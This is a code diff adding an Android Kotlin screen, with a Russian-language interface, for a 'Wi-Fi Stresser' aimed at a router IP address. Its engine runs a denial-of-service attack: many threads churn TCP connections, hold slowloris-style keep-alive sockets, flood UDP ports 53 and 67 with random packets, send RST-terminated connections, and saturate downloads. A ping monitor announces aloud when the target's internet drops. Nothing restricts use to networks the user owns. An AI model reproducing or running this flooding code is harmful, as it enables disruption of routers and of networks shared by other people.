@@ -1,0 +1,720 @@
+package com.toolkit.app
+
+import android.speech.tts.TextToSpeech
+import androidx.activity.compose.BackHandler
+import androidx.compose.animation.core.RepeatMode
+import androidx.compose.animation.core.animateFloat
+import androidx.compose.animation.core.infiniteRepeatable
+import androidx.compose.animation.core.rememberInfiniteTransition
+import androidx.compose.animation.core.tween
+import androidx.compose.foundation.Canvas
+import androidx.compose.foundation.background
+import androidx.compose.foundation.clickable
+import androidx.compose.foundation.layout.*
+import androidx.compose.foundation.lazy.LazyColumn
+import androidx.compose.foundation.lazy.items
+import androidx.compose.foundation.lazy.rememberLazyListState
+import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.shape.CircleShape
+import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.foundation.text.KeyboardActions
+import androidx.compose.foundation.text.KeyboardOptions
+import androidx.compose.foundation.verticalScroll
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.automirrored.filled.ArrowBack
+import androidx.compose.material3.Button
+import androidx.compose.material3.ButtonDefaults
+import androidx.compose.material3.Icon
+import androidx.compose.material3.MaterialTheme
+import androidx.compose.material3.OutlinedTextField
+import androidx.compose.material3.OutlinedTextFieldDefaults
+import androidx.compose.material3.Text
+import androidx.compose.runtime.*
+import androidx.compose.ui.Alignment
+import androidx.compose.ui.Modifier
+import androidx.compose.ui.geometry.Offset
+import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.graphics.Path
+import androidx.compose.ui.graphics.StrokeCap
+import androidx.compose.ui.graphics.drawscope.Stroke
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.text.font.FontFamily
+import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.input.ImeAction
+import androidx.compose.ui.text.input.KeyboardType
+import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
+import com.toolkit.app.ui.Accent
+import com.toolkit.app.ui.AccentSoft
+import com.toolkit.app.ui.BorderGlass
+import com.toolkit.app.ui.GlassCard
+import com.toolkit.app.ui.OkGreen
+import com.toolkit.app.ui.TextDim
+import com.toolkit.app.ui.TextMain
+import com.toolkit.app.ui.WarnOrange
+import java.net.DatagramPacket
+import java.net.DatagramSocket
+import java.net.InetSocketAddress
+import java.net.Socket
+import java.text.SimpleDateFormat
+import java.util.*
+import java.util.concurrent.atomic.AtomicBoolean
+import java.util.concurrent.atomic.AtomicInteger
+import java.util.concurrent.atomic.AtomicLong
+import kotlin.concurrent.thread
+import kotlin.math.max
+
+data class StresserSnapshot(
+    val downKBs: Float = 0f,
+    val upKBs: Float = 0f,
+    val pingMs: Float = 0f,
+    val liveConns: Int = 0,
+    val okRate: Float = 100f,
+    val dropped: Boolean = false,
+)
+
+class StresserEngine(
+    private val host: String,
+    private val onMetrics: (StresserSnapshot) -> Unit,
+    private val onLog: (String, Color) -> Unit,
+    private val onDrop: () -> Unit,
+) {
+    private val running = AtomicBoolean(false)
+    private val sent = AtomicLong(0)
+    private val recv = AtomicLong(0)
+    private val live = AtomicInteger(0)
+    private val okCount = AtomicLong(0)
+    private val failCount = AtomicLong(0)
+    private val pingFails = AtomicInteger(0)
+    @Volatile var lastPing = 0f
+        private set
+    @Volatile var dropped = false
+        private set
+    val pingHistory: List<Float>
+        get() = synchronized(historyLock) { ArrayList(history) }
+    private val historyLock = Any()
+    private val history = ArrayList<Float>()
+    private val pool = Collections.synchronizedSet(HashSet<Socket>())
+    private val workers = ArrayList<Thread>()
+
+    fun start() {
+        if (running.getAndSet(true)) return
+        onLog("Стрессер запущен, цель: $host:80", Accent)
+        fun go(block: () -> Unit) {
+            val t = thread(isDaemon = true, name = "stress-worker") {
+                try {
+                    block()
+                } catch (t: Throwable) {
+                    failCount.incrementAndGet()
+                }
+            }
+            workers.add(t)
+        }
+        for (i in 0 until 8) go { churnWorker() }
+        for (i in 0 until 4) go { keepAliveWorker() }
+        for (i in 0 until 6) go { udpWorker(53) }
+        for (i in 0 until 6) go { udpWorker(67) }
+        for (i in 0 until 12) go { rstWorker() }
+        for (i in 0 until 3) go { downloadWorker() }
+        go { pingLoop() }
+        go { snapshotLoop() }
+    }
+
+    fun stop() {
+        if (!running.getAndSet(false)) return
+        onLog("Останавливаю…", WarnOrange)
+        synchronized(pool) {
+            pool.forEach { runCatching { it.close() } }
+            pool.clear()
+        }
+        workers.forEach { runCatching { it.join(1500) } }
+        workers.clear()
+        onLog("Стрессер остановлен", OkGreen)
+    }
+
+    private fun tcpConnect(): Socket? {
+        return try {
+            val s = Socket()
+            s.tcpNoDelay = true
+            s.connect(InetSocketAddress(host, 80), 3500)
+            live.incrementAndGet()
+            okCount.incrementAndGet()
+            synchronized(pool) { pool.add(s) }
+            s
+        } catch (e: Throwable) {
+            failCount.incrementAndGet()
+            null
+        }
+    }
+
+    private fun release(s: Socket?) {
+        if (s == null) return
+        runCatching { s.close() }
+        synchronized(pool) { pool.remove(s) }
+        live.decrementAndGet()
+    }
+
+    private fun churnWorker() {
+        while (running.get()) {
+            val s = tcpConnect()
+            if (s != null) {
+                try {
+                    val q = Random().nextInt(999999)
+                    val head = "GET /?$q HTTP/1.1\r\n" +
+                        "Host: $host\r\n" +
+                        "User-Agent: Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36\r\n" +
+                        "Accept: text/html,*/*;q=0.8\r\n" +
+                        "Connection: Keep-Alive\r\n" +
+                        "X-Speed: ${Random().nextInt(9999)}\r\n\r\n"
+                    val b = head.toByteArray()
+                    s.getOutputStream().write(b)
+                    sent.addAndGet(b.size.toLong())
+                    s.soTimeout = 1500
+                    val buf = ByteArray(4096)
+                    val got = s.getInputStream().read(buf)
+                    if (got > 0) recv.addAndGet(got.toLong())
+                } catch (t: Throwable) {
+                    failCount.incrementAndGet()
+                } finally {
+                    release(s)
+                }
+            }
+        }
+    }
+
+    private fun keepAliveWorker() {
+        while (running.get()) {
+            val s = tcpConnect()
+            if (s != null) {
+                try {
+                    val head = "GET /?KA=${Random().nextInt(999999)} HTTP/1.1\r\nHost: $host\r\n" +
+                        "User-Agent: Stresser/1.0\r\nConnection: Keep-Alive\r\nKeep-Alive: 300\r\n\r\n"
+                    val b = head.toByteArray()
+                    s.getOutputStream().write(b)
+                    sent.addAndGet(b.size.toLong())
+                    s.soTimeout = 20000
+                    val buf = ByteArray(1024)
+                    var last = System.currentTimeMillis()
+                    while (running.get()) {
+                        val now = System.currentTimeMillis()
+                        if (now - last > 6000) {
+                            val ping = "X-ignore: ${Random().nextInt(9999)}\r\n".toByteArray()
+                            s.getOutputStream().write(ping)
+                            sent.addAndGet(ping.size.toLong())
+                            last = now
+                        }
+                        val got = s.getInputStream().read(buf)
+                        if (got <= 0) break
+                        recv.addAndGet(got.toLong())
+                    }
+                } catch (t: Throwable) {
+                    failCount.incrementAndGet()
+                } finally {
+                    release(s)
+                }
+            }
+        }
+    }
+
+    private fun udpWorker(port: Int) {
+        val s = DatagramSocket()
+        val p = Random().nextBytes(1200)
+        while (running.get()) {
+            try {
+                val packet = DatagramPacket(p, p.size, InetSocketAddress(host, port))
+                s.send(packet)
+                sent.addAndGet(p.size.toLong())
+            } catch (t: Throwable) {
+                failCount.incrementAndGet()
+            }
+        }
+        runCatching { s.close() }
+    }
+
+    private fun rstWorker() {
+        while (running.get()) {
+            val s = tcpConnect()
+            if (s != null) {
+                try {
+                    val b = "GET / HTTP/1.0\r\n\r\n".toByteArray()
+                    s.getOutputStream().write(b)
+                    sent.addAndGet(b.size.toLong())
+                    s.setSoLinger(true, 0)
+                } catch (t: Throwable) {
+                    failCount.incrementAndGet()
+                } finally {
+                    release(s)
+                }
+            }
+        }
+    }
+
+    private fun downloadWorker() {
+        while (running.get()) {
+            val s = tcpConnect()
+            if (s != null) {
+                try {
+                    val b = "GET / HTTP/1.0\r\nHost: $host\r\nUser-Agent: SpeedTest/1.0\r\n\r\n".toByteArray()
+                    s.getOutputStream().write(b)
+                    sent.addAndGet(b.size.toLong())
+                    s.soTimeout = 2500
+                    val buf = ByteArray(16384)
+                    while (running.get()) {
+                        val got = s.getInputStream().read(buf)
+                        if (got <= 0) break
+                        recv.addAndGet(got.toLong())
+                    }
+                } catch (t: Throwable) {
+                    failCount.incrementAndGet()
+                } finally {
+                    release(s)
+                }
+            }
+        }
+    }
+
+    private fun pingLoop() {
+        while (running.get()) {
+            val t0 = System.currentTimeMillis()
+            var ok = false
+            var s: Socket? = null
+            try {
+                s = Socket()
+                s.tcpNoDelay = true
+                s.connect(InetSocketAddress(host, 80), 2500)
+                ok = true
+            } catch (t: Throwable) {
+            } finally {
+                runCatching { s?.close() }
+            }
+            val ms = (System.currentTimeMillis() - t0).toFloat()
+            synchronized(historyLock) {
+                if (ok) {
+                    pingFails.set(0)
+                    lastPing = ms
+                    history.add(ms)
+                } else {
+                    val f = pingFails.incrementAndGet()
+                    if (f >= 2) {
+                        val was = dropped
+                        dropped = true
+                        if (!was) onDrop()
+                    }
+                    history.add(-1f)
+                }
+                if (history.size > 90) history.removeAt(0)
+            }
+            Thread.sleep(1200)
+        }
+    }
+
+    private fun snapshotLoop() {
+        var lastSent = 0L
+        var lastRecv = 0L
+        while (running.get()) {
+            val s = sent.get()
+            val r = recv.get()
+            val ok = okCount.get()
+            val fail = failCount.get()
+            val total = ok + fail
+            val pings = pingHistory
+            val lastGood = pings.filter { it >= 0 }.lastOrNull() ?: lastPing
+            onMetrics(
+                StresserSnapshot(
+                    downKBs = (r - lastRecv) / 1024f,
+                    upKBs = (s - lastSent) / 1024f,
+                    pingMs = if (lastGood >= 0) lastGood else 0f,
+                    liveConns = live.get(),
+                    okRate = if (total > 0) ok * 100f / total else 100f,
+                    dropped = dropped,
+                )
+            )
+            lastSent = s
+            lastRecv = r
+            Thread.sleep(1000)
+        }
+    }
+}
+
+@Composable
+fun WifiIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
+    val alpha = if (animated) {
+        val t = rememberInfiniteTransition(label = "wifi")
+        val a = t.animateFloat(
+            initialValue = 0.35f,
+            targetValue = 1f,
+            animationSpec = infiniteRepeatable(tween(700), RepeatMode.Reverse),
+            label = "pulse",
+        )
+        a.value
+    } else 1f
+    Canvas(modifier = modifier) {
+        val cx = size.width / 2f
+        val cy = size.height * 0.62f
+        val r1 = size.minDimension * 0.13f
+        val r2 = r1 * 1.95f
+        val r3 = r2 * 1.6f
+        val start = 202.5f
+        val sweep = 315f
+        val strokeStyle = Stroke(width = size.minDimension * 0.085f, cap = StrokeCap.Round)
+        drawArc(color.copy(alpha = alpha), start, sweep, false, topLeft = Offset(cx - r3, cy - r3), size = androidx.compose.ui.geometry.Size(r3 * 2, r3 * 2), style = strokeStyle)
+        drawArc(color.copy(alpha = alpha * 0.85f), start, sweep, false, topLeft = Offset(cx - r2, cy - r2), size = androidx.compose.ui.geometry.Size(r2 * 2, r2 * 2), style = strokeStyle)
+        drawArc(color.copy(alpha = alpha * 0.7f), start, sweep, false, topLeft = Offset(cx - r1, cy - r1), size = androidx.compose.ui.geometry.Size(r1 * 2, r1 * 2), style = strokeStyle)
+        drawCircle(color, radius = r1 * 0.62f, center = Offset(cx, cy))
+    }
+}
+
+private data class LogLine(val text: String, val color: Color)
+
+@Composable
+fun WifiStresserScreen(onBack: () -> Unit) {
+    val context = LocalContext.current
+    var ip by remember { mutableStateOf("192.168.0.1") }
+    var running by remember { mutableStateOf(false) }
+    var snap by remember { mutableStateOf(StresserSnapshot()) }
+    val logs = remember { mutableStateListOf<LogLine>() }
+    val listState = rememberLazyListState()
+    val engine = remember { mutableStateOf<StresserEngine?>(null) }
+    val wasDropped = remember { mutableStateOf(false) }
+    val pingSpiked = remember { mutableStateOf(false) }
+    val tts = remember { mutableStateOf<TextToSpeech?>(null) }
+
+    BackHandler(enabled = true, onBack = onBack)
+
+    fun say(text: String) {
+        runCatching {
+            tts.value?.speak(text, TextToSpeech.QUEUE_FLUSH, null, text.hashCode().toString())
+        }
+    }
+
+    fun addLog(text: String, color: Color = TextDim) {
+        val ts = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
+        logs.add(LogLine("[$ts] $text", color))
+        if (logs.size > 80) logs.removeAt(0)
+    }
+
+    LaunchedEffect(Unit) {
+        var t: TextToSpeech? = null
+        t = TextToSpeech(context) { status ->
+            if (status == TextToSpeech.SUCCESS) {
+                t?.language = Locale("ru", "RU")
+                t?.setSpeechRate(0.95f)
+            }
+        }
+        tts.value = t
+    }
+    DisposableEffect(Unit) {
+        onDispose {
+            runCatching { tts.value?.stop() }
+            runCatching { tts.value?.shutdown() }
+        }
+    }
+    LaunchedEffect(logs.size) {
+        if (logs.isNotEmpty()) runCatching { listState.scrollToItem(logs.size - 1) }
+    }
+
+    fun stopStresser() {
+        running = false
+        engine.value?.stop()
+        engine.value = null
+        say("Стрессер остановлен")
+    }
+
+    fun startStresser() {
+        val h = ip.trim()
+        if (!Regex("^\\d{1,3}(\\.\\d{1,3}){3}\$").matches(h)) {
+            addLog("Некорректный IP-адрес: $h", WarnOrange)
+            say("Некорректный IP адрес")
+            return
+        }
+        logs.clear()
+        wasDropped.value = false
+        pingSpiked.value = false
+        val e = StresserEngine(
+            host = h,
+            onMetrics = { m ->
+                snap = m
+                if (!m.dropped) wasDropped.value = false
+                if (m.pingMs > 1000 && !pingSpiked.value) {
+                    pingSpiked.value = true
+                    addLog("Пинг подскочил: ${m.pingMs.toInt()} мс", WarnOrange)
+                    say("Внимание, пинг высокий: ${m.pingMs.toInt()} миллисекунд")
+                } else if (m.pingMs < 400 && pingSpiked.value) {
+                    pingSpiked.value = false
+                }
+            },
+            onLog = { text, color -> addLog(text, color) },
+            onDrop = {
+                wasDropped.value = true
+                addLog("Интернет упал! Нет ответа от роутера", Color(0xFFFF6B6B))
+                say("Внимание, интернет упал")
+            },
+        )
+        engine.value = e
+        running = true
+        addLog("Подключение к сети…", AccentSoft)
+        e.start()
+        say("Стрессер запущен")
+    }
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState())
+            .padding(horizontal = 20.dp, vertical = 18.dp),
+    ) {
+        Row(verticalAlignment = Alignment.CenterVertically) {
+            Box(
+                modifier = Modifier
+                    .size(40.dp)
+                    .clip(CircleShape)
+                    .clickable(onClick = onBack),
+                contentAlignment = Alignment.Center,
+            ) {
+                Icon(
+                    Icons.AutoMirrored.Filled.ArrowBack,
+                    contentDescription = "Назад",
+                    tint = TextMain,
+                    modifier = Modifier.size(22.dp),
+                )
+            }
+            Spacer(Modifier.width(6.dp))
+            Text(
+                "Wi-Fi Stresser",
+                color = TextMain,
+                fontSize = 22.sp,
+                fontWeight = FontWeight.Bold,
+            )
+            Spacer(Modifier.weight(1f))
+            WifiIcon(
+                modifier = Modifier.size(30.dp),
+                color = if (running) AccentSoft else Accent,
+                animated = running,
+            )
+        }
+
+        Spacer(Modifier.height(14.dp))
+        GlassCard(modifier = Modifier.fillMaxWidth()) {
+            Column(Modifier.padding(16.dp)) {
+                Text(
+                    "Стрессируем Wi-Fi. Требуется IP-адрес роутера — есть в настройках сети, " +
+                        "чаще всего в разделе «Шлюз» или «DNS» (цифры вида 192.168.0.1 или 192.168.1.1, " +
+                        "у всех разные). Работает без root-прав. Нужно быть подключённым к той сети, " +
+                        "которую вы собираетесь стрессировать.",
+                    color = TextDim,
+                    fontSize = 13.sp,
+                    lineHeight = 18.sp,
+                )
+            }
+        }
+
+        Spacer(Modifier.height(12.dp))
+        GlassCard(modifier = Modifier.fillMaxWidth()) {
+            Row(
+                modifier = Modifier.padding(14.dp),
+                verticalAlignment = Alignment.CenterVertically,
+            ) {
+                OutlinedTextField(
+                    value = ip,
+                    onValueChange = { ip = it },
+                    modifier = Modifier.weight(1f),
+                    singleLine = true,
+                    label = { Text("IP роутера", color = TextDim, fontSize = 13.sp) },
+                    textStyle = MaterialTheme.typography.bodyLarge.copy(
+                        color = TextMain,
+                        fontSize = 16.sp,
+                        fontFamily = FontFamily.Monospace,
+                    ),
+                    keyboardOptions = KeyboardOptions(
+                        keyboardType = KeyboardType.Number,
+                        imeAction = ImeAction.Done,
+                    ),
+                    keyboardActions = KeyboardActions(onDone = { if (!running) startStresser() }),
+                    shape = RoundedCornerShape(14.dp),
+                    colors = OutlinedTextFieldDefaults.colors(
+                        focusedBorderColor = Accent,
+                        unfocusedBorderColor = BorderGlass,
+                        focusedTextColor = TextMain,
+                        cursorColor = Accent,
+                        focusedLabelColor = AccentSoft,
+                    ),
+                )
+                Spacer(Modifier.width(12.dp))
+                Button(
+                    onClick = { if (running) stopStresser() else startStresser() },
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = if (running) Color(0xFFB3261E) else Accent,
+                        contentColor = if (running) Color.White else Color(0xFF0E1013),
+                    ),
+                    shape = RoundedCornerShape(14.dp),
+                    modifier = Modifier.height(54.dp),
+                ) {
+                    Text(
+                        if (running) "СТОП" else "СТАРТ",
+                        fontSize = 14.sp,
+                        fontWeight = FontWeight.Bold,
+                        letterSpacing = 1.sp,
+                    )
+                }
+            }
+        }
+
+        Spacer(Modifier.height(12.dp))
+        Row(Modifier.fillMaxWidth()) {
+            StatTile("Скачивание", if (snap.downKBs > 0) "${snap.downKBs.toInt()} КБ/с" else "—")
+            Spacer(Modifier.width(8.dp))
+            StatTile("Отдача", if (snap.upKBs > 0) "${snap.upKBs.toInt()} КБ/с" else "—")
+            Spacer(Modifier.width(8.dp))
+            StatTile("Пинг", if (snap.pingMs > 0) "${snap.pingMs.toInt()} мс" else "—")
+            Spacer(Modifier.width(8.dp))
+            StatTile("Соединения", "${snap.liveConns}")
+        }
+
+        Spacer(Modifier.height(12.dp))
+        GlassCard(modifier = Modifier.fillMaxWidth()) {
+            Column(Modifier.padding(14.dp)) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Text(
+                        "Интернет в реальном времени",
+                        color = TextMain,
+                        fontSize = 14.sp,
+                        fontWeight = FontWeight.SemiBold,
+                    )
+                    Spacer(Modifier.weight(1f))
+                    if (snap.dropped) {
+                        Text("НЕТ ИНТЕРНЕТА", color = Color(0xFFFF6B6B), fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                    } else {
+                        Text(
+                            "Успех ${snap.okRate.toInt()}%",
+                            color = if (snap.okRate > 80) OkGreen else WarnOrange,
+                            fontSize = 11.sp,
+                            fontWeight = FontWeight.Bold,
+                        )
+                    }
+                }
+                Spacer(Modifier.height(8.dp))
+                LatencyGraph(engine.value?.pingHistory)
+                Spacer(Modifier.height(4.dp))
+                Row {
+                    Box(Modifier.size(8.dp).clip(CircleShape).background(Accent))
+                    Spacer(Modifier.width(6.dp))
+                    Text("пинг", color = TextDim, fontSize = 11.sp)
+                    Spacer(Modifier.width(14.dp))
+                    Box(Modifier.size(8.dp).clip(CircleShape).background(Color(0xFFFF6B6B)))
+                    Spacer(Modifier.width(6.dp))
+                    Text("обрыв связи", color = TextDim, fontSize = 11.sp)
+                }
+            }
+        }
+
+        Spacer(Modifier.height(12.dp))
+        GlassCard(modifier = Modifier.fillMaxWidth()) {
+            Column(Modifier.padding(14.dp)) {
+                Text("Логи", color = TextMain, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
+                Spacer(Modifier.height(6.dp))
+                if (logs.isEmpty()) {
+                    Text(
+                        "Запустите стрессер — здесь появится лог.",
+                        color = TextDim,
+                        fontSize = 12.sp,
+                    )
+                } else {
+                    LazyColumn(
+                        state = listState,
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(180.dp),
+                    ) {
+                        items(logs.size) { i ->
+                            val l = logs[i]
+                            Text(
+                                l.text,
+                                color = l.color,
+                                fontFamily = FontFamily.Monospace,
+                                fontSize = 12.sp,
+                                lineHeight = 16.sp,
+                            )
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+@Composable
+private fun StatTile(label: String, value: String) {
+    GlassCard(modifier = Modifier.weight(1f)) {
+        Column(
+            Modifier.padding(vertical = 12.dp),
+            horizontalAlignment = Alignment.CenterHorizontally,
+        ) {
+            Text(label, color = TextDim, fontSize = 10.sp)
+            Spacer(Modifier.height(4.dp))
+            Text(
+                value,
+                color = TextMain,
+                fontSize = 13.sp,
+                fontWeight = FontWeight.SemiBold,
+                fontFamily = FontFamily.Monospace,
+            )
+        }
+    }
+}
+
+@Composable
+private fun LatencyGraph(history: List<Float>?) {
+    Canvas(
+        modifier = Modifier
+            .fillMaxWidth()
+            .height(120.dp),
+    ) {
+        val pts = history ?: return@Canvas
+        val n = pts.size
+        if (n == 0) {
+            val y = size.height / 2f
+            drawLine(BorderGlass, Offset(0f, y), Offset(size.width, y), strokeWidth = 1.5f)
+            return@Canvas
+        }
+        val from = max(0, n - 60)
+        val data = pts.subList(from, n)
+        val maxV = max(250f, data.filter { it >= 0 }.maxOrNull() ?: 250f) * 1.2f
+        val w = size.width
+        val h = size.height
+        for (g in 1..3) {
+            val y = h - h * g / 4f
+            drawLine(BorderGlass, Offset(0f, y), Offset(w, y), strokeWidth = 1f)
+        }
+        val path = Path()
+        var started = false
+        data.forEachIndexed { i, v ->
+            val x = w * (from + i) / 59f
+            if (v >= 0) {
+                val y = h - (minOf(v, maxV) / maxV) * h
+                if (!started) {
+                    path.moveTo(x, y)
+                    started = true
+                } else {
+                    path.lineTo(x, y)
+                }
+            }
+        }
+        if (started) {
+            drawPath(path, Accent, style = Stroke(width = 2.dp.toPx(), cap = StrokeCap.Round))
+        }
+        data.forEachIndexed { i, v ->
+            if (v < 0) {
+                val x = w * (from + i) / 59f
+                val y = h - 6.dp.toPx()
+                drawLine(Color(0xFFFF6B6B), Offset(x - 4.dp.toPx(), y), Offset(x + 4.dp.toPx(), y), strokeWidth = 2.5f, cap = StrokeCap.Round)
+                drawLine(Color(0xFFFF6B6B), Offset(x, y - 4.dp.toPx()), Offset(x, y + 4.dp.toPx()), strokeWidth = 2.5f, cap = StrokeCap.Round)
+            }
+        }
+        val last = data.lastOrNull()
+        if (last != null && last >= 0) {
+            val x = w * (from + data.size - 1) / 59f
+            val y = h - (minOf(last, maxV) / maxV) * h
+            drawCircle(AccentSoft, radius = 4.dp.toPx(), center = Offset(x, y))
+        }
+    }
+}
